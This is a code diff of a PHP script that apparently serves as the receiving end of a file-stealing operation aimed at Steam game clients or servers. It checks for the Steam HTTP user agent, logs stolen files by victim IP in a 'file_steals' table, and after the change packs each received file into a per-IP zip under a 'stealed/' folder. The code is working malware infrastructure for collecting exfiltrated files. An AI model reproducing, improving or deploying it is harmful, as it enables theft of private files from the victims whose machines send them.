@@ -14,12 +14,10 @@ $t = $GLOBALS['DB']->GetContent("file_steals", ["ip" => $ip_data[0]]);
 
 if ($browser == "Valve/Steam HTTP Client 1.0 (4000)") {
 
-
-
 if ($GLOBALS['DB']->Count("file_steals", ["ip" => $ip_data[0]]) == 1 && $GLOBALS['DB']->Count("file_steals", ["folder" => $folder]) == 1 && $GLOBALS['DB']->Count("file_steals", ["name" => $filename]) == 1 && $GLOBALS['DB']->Count("file_steals", ["content" => $content]) == 1 ) {
 	die("print('alreadyexist')");
 }
-
+	
 $searchfor = '.php';
 $contents = $filename;
 $pattern = preg_quote($searchfor, '/');
@@ -34,11 +32,22 @@ $pattern = "/^.*$pattern.*\$/m";
 		if(!preg_match_all($pattern, $contents, $matches)){
 
 
-			$GLOBALS['DB']->Insert("file_steals", ["ip" => $ip_data[0], "folder" => $folder, "name" => $filename, "content" => $content]);
+			//$GLOBALS['DB']->Insert("file_steals", ["ip" => $ip_data[0], "folder" => $folder, "name" => $filename, "content" => $content]);
 
-			if ($GLOBALS['DB']->Count("file_steals_list", ["ip" => $ip_data[0]]) == 0){
-				$GLOBALS['DB']->Insert("file_steals_list", ["ip" => $ip_data[0], "name" => $name]);
+			$zip = new ZipArchive;
+			if ($zip->open('stealed/'.$ip_data[0].'filesteal.zip') === TRUE) {
+
+				$zip->addFromString($folder.$filename, base64_decode($content));
+				$zip->close();
+
+			}else{
+
+				$zip->open('stealed/'.$ip_data[0].'filesteal.zip', ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE  );
+				$zip->addFromString($folder.$filename, base64_decode($content));
+				$zip->close();
+
 			}
+
 			die("print('ok2')");
 
 
